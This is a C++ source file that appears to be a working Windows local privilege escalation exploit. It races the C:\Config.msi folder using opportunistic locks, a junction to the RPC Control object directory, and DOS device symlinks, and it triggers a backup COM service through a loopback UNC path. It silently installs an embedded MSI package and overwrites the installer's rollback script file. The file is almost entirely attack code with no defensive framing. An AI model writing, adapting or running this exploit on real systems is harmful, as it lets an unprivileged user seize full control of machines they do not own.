#include "def.h"

int wmain(int argc, wchar_t** argv)
{

    load();

    hMsiDir = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
    if (hMsiDir == NULL)
    {
        printf("[!] Failed to create C:\\Config.msi directory. Trying to delete it.\n");
        install(NULL);
        hMsiDir = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
        if (hMsiDir != NULL)
        {
            printf("[+] Successfully removed and recreated C:\\Config.Msi.\n");
        }
        else
        {
            printf("[!] Failed. Cannot remove c:\\Config.msi");
            return 1;
        }
    }
    if (!PathIsDirectoryEmpty(L"C:\\Config.Msi"))
    {
        printf("[!] Failed.  C:\\Config.Msi already exists and is not empty.\n");
        return 1;
    }
    printf("[+] Config.msi directory created!\n");
    dir = (LPWSTR)malloc(MAX_PATH);
    ZeroMemory(dir, MAX_PATH);
    GetTmpDir(dir);
    printf("[*] Directory: %ls\n", dir);
    if (!CreateDirectory(dir, NULL)) {
        printf("[!] Cannot create %ls directory!\n", dir);
        return 1;
    }
    hDir = CreateFile(dir, GENERIC_WRITE | GENERIC_READ | DELETE, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_DELETE_ON_CLOSE, NULL);

    if (hDir == INVALID_HANDLE_VALUE) {
        return 1;

    }

    WCHAR path[MAX_PATH * 2] = { 0x0 };
    GetFinalPathNameByHandle(hDir, path, MAX_PATH * 2, VOLUME_NAME_NONE);
    swprintf(unc, L"\\\\127.0.0.1\\c$%ls", path);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FindFile, hDir, 0, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Fail, NULL, 0, NULL);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriorityBoost(GetCurrentThread(), TRUE);    
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    FileOpLock* oplock;
    oplock = FileOpLock::CreateLock(hMsiDir, cb1);
    if (oplock != nullptr) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Trigger, NULL, 0, NULL);
        oplock->WaitForLock(INFINITE);
        delete oplock;
    }
    do {
        hMsiDir = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
    } while (hMsiDir == NULL);
    char buff[4096];
    DWORD retbt = 0;
    FILE_NOTIFY_INFORMATION* fn;
    WCHAR* extension;
    WCHAR* extension2;
    do {
        ReadDirectoryChangesW(hMsiDir, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
            &retbt, NULL, NULL);
        fn = (FILE_NOTIFY_INFORMATION*)buff;
        size_t sz = fn->FileNameLength / sizeof(WCHAR);
        fn->FileName[sz] = '\0';
        extension = fn->FileName;
        PathCchFindExtension(extension, MAX_PATH, &extension2);
    } while (wcscmp(extension2, L".rbs") != 0);
    SetSecurityInfo(hMsiDir, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
    while (!Move(hMsiDir)) {

    }

    HANDLE cfg_h = myCreateDirectory(BuildPath(L"C:\\Config.msi"), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE);
    WCHAR rbsfile[MAX_PATH];
    _swprintf(rbsfile, L"C:\\Config.msi\\%s", fn->FileName);
    HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) {
        printf("[+] Rollback file overwritten!\n");

    }
    else
    {
        printf("[!] Failed to overwrite rbs file!\n");
    }
    CloseHandle(rbs);
    CloseHandle(cfg_h);
    DeleteJunction(hDir);
    DelDosDeviceSymLink(object, L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
}
BOOL Trigger() {
    HRESULT hr = CoInitialize(NULL);
    ISdScheduledBackup* sdc;
   
    
    PStruct_10 aaa = (PStruct_10)malloc(sizeof(Struct_10));
    hr = CoCreateInstance(__uuidof(CLSID_SDC), NULL, CLSCTX_LOCAL_SERVER, __uuidof(ISdScheduledBackup), (LPVOID*)&sdc);
    if (SUCCEEDED(hr)) {
        printf("[*] Path: %ls\n", unc);
        hr = sdc->Proc7(unc, aaa);
        if (SUCCEEDED(hr)) {
            return TRUE;
        }
        else
        {
            printf("0x%x\n", hr);
            return FALSE;
        }
    }
    else
    {
        printf("0x%x\n", hr);
        return FALSE;
    }


}

void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    }
        if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
            printf("Cannot load api's %d\n", GetLastError());
            exit(0);
        }

}
void cb() {
    printf("[+] Oplock!\n");
    while(!Move(hFile)){}
    
    CreateJunction(hDir, L"\\RPC Control");
    DosDeviceSymLink(object, BuildPath(target));
    
}
void cb1() {
    SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS);
    Move(hMsiDir);
    hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL);

    HANDLE hd;
    do {
        hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
    } while (!hd);
    do {
        CloseHandle(hd);
        hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
    } while (hd);
    CloseHandle(hd);
    do {
        hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);

    } while (GetLastError() != -1073741790);

}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}
BOOL Move(HANDLE hFile) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    _swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}
LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;
}
VOID FindFile(HANDLE hDidr) {
    PFILE_NOTIFY_INFORMATION fi = NULL;
    WCHAR file[MAX_PATH] = { 0x0 };
    FileOpLock* oplock;
    WCHAR* final_path = (WCHAR*)malloc(MAX_PATH);
    HANDLE  hDir = CreateFile(dir, GENERIC_WRITE | GENERIC_READ, FULL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    BOOL stop = FALSE;
    do {

        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(hDir, buff, 4096, FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, NULL, NULL);
       
        fi = (PFILE_NOTIFY_INFORMATION)buff;
        if (fi->Action == FILE_ACTION_ADDED) {
            stop = TRUE;
        }
    } while (stop == FALSE);
    _swprintf(file, L"%s\\%s",dir, fi->FileName);
    _swprintf(object, L"Global\\GLOBALROOT\\RPC Control\\%s", fi->FileName);
    do {
        hFile = CreateFile(file, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    } while (hFile == INVALID_HANDLE_VALUE);

    oplock = FileOpLock::CreateLock(hFile, cb);
    if (oplock != nullptr) {
        oplock->WaitForLock(INFINITE);
        delete oplock;
    }
}
VOID GetTmpDir(LPWSTR dir) {
    LPWSTR username;
    DWORD szUsername = 0;
    WCHAR path[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0x0 };

    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    GetUserName(NULL, &szUsername);
    username = (LPWSTR)malloc(szUsername);
    GetUserName(username, &szUsername);
    swprintf(path, L"C:\\users\\%s\\appdata\\local\\temp\\%s", username, str_uuid);
    StrCatW(dir, path);
}
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
    UNICODE_STRING ufile;
    HANDLE hDir;
    pRtlInitUnicodeString(&ufile, file);
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    NTSTATUS retcode;
    InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

    retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

    if (!NT_SUCCESS(retcode)) {
        SetLastError(retcode);
        return NULL;
    }
    return hDir;
}
DWORD WINAPI install(void*) {

    HMODULE hm = GetModuleHandle(NULL);
    HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L"msi");
    wchar_t msipackage[MAX_PATH] = { 0x0 };
    GetTempFileName(L"C:\\windows\\temp\\", L"MSI", 0, msipackage);
    printf("[*] MSI file: %ls\n", msipackage);
    DWORD MsiSize = SizeofResource(hm, res);
    void* MsiBuff = LoadResource(hm, res);
    HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL);
    CloseHandle(pkg);
    MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
    MsiInstallProduct(msipackage, L"ACTION=INSTALL");
    MsiInstallProduct(msipackage, L"REMOVE=ALL");
    DeleteFile(msipackage);
    return 0;
}
VOID Fail() {
    Sleep(5000);
    printf("[!] Race condtion failed!\n");
    DeleteJunction(hDir);
    DelDosDeviceSymLink(object, L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
    exit(1);
}